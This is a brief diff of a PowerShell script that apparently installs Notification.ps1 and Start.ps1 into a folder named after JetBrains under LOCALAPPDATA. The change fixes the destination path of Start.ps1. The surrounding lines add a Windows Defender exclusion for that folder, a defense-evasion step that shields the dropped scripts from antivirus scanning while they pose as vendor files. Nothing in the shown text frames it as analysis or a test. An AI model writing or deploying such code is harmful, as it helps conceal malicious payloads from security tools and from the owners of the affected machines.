@@ -6,7 +6,7 @@ $LocationStart = "$env:LOCALAPPDATA\JetBrains\Start.ps1"
 $destDir = "$env:LOCALAPPDATA\JetBrains"
 New-Item -Path $destDir -ItemType Directory -Force | Out-Null
 Move-Item -Path ".\Notification.ps1" -Destination $Location -Force
-Move-Item -Path ".\Start.ps1" -Destination $Location -Force
+Move-Item -Path ".\Start.ps1" -Destination $LocationStart -Force
 
 $exclusions = "$env:LOCALAPPDATA\JetBrains"
 Set-MpPreference -ExclusionPath $exclusions
